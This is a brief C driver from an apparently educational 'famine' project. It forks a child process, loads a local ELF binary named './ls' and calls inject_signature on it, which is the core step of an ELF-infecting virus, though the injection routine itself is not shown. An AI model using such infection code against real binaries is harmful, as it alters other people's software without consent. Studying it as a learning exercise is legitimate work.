#include "../include/famine.h"


int main(void) {
    set_log_level(L_DEBUG);
    DBG("This is a debug message.\n");

    pid_t pid = fork();

    if (pid == 0) {
        FamineFile *file = elf_file_get("./ls");

        if (*get_log_level() == L_NONE) {
            mute_output();
        }

        if (file != NULL) {
            DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
            inject_signature(file);
            destroy_famine_file(file);
        } else {
            LOG(L_ERROR, "Failed to load ELF file.\n");
        }

    }

    wait(NULL);
    return (0);
}
